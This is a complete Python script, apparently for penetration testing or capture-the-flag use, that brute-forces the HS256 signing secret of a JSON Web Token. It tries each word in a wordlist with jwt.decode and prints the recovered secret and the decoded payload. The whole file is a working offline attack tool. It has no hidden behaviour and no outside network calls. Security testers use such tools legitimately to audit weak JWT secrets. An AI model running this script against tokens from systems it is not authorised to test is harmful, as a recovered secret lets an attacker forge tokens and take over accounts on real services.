#!/usr/bin/python

import jwt
import sys
import os

def brute_force_jwt(token, wordlist_path):
    # Check if the wordlist file exists
    if not os.path.exists(wordlist_path):
        print(f"Error: Wordlist file '{wordlist_path}' not found.")
        sys.exit(1)

    # Read the wordlist
    with open(wordlist_path, 'r') as file:
        secrets = file.read().splitlines()

    # Split the JWT into its components for verification
    try:
        header, payload, signature = token.split('.')
    except ValueError:
        print("Error: Invalid JWT token format. Make sure it has three parts separated by dots.")
        sys.exit(1)

    # Attempt to brute-force the secret
    for secret in secrets:
        try:
            # Decode the token, ignoring audience validation
            decoded = jwt.decode(token, secret, algorithms=["HS256"], options={"verify_aud": False})
            print(f"\n[+] Secret Found: {secret}")
            print(f"[+] Decoded Payload: {decoded}")
            return
        except jwt.InvalidSignatureError:
            continue  # Try the next secret
        except Exception as e:
            print(f"Error with secret '{secret}': {e}")
    
    print("\n[-] No matching secret found in the wordlist.")

if __name__ == "__main__":
    # Check if the correct number of arguments are provided
    if len(sys.argv) != 3:
        print("Usage: python jwt_bruteforce.py <jwt-token-file> <wordlist-file>")
        sys.exit(1)

    # Read the token and wordlist file paths from arguments
    token_file = sys.argv[1]
    wordlist_file = sys.argv[2]

    # Check if the token file exists
    if not os.path.exists(token_file):
        print(f"Error: Token file '{token_file}' not found.")
        sys.exit(1)

    # Read the JWT token from the file
    with open(token_file, 'r') as file:
        jwt_token = file.read().strip()

    # Run the brute-forcing function
    brute_force_jwt(jwt_token, wordlist_file)
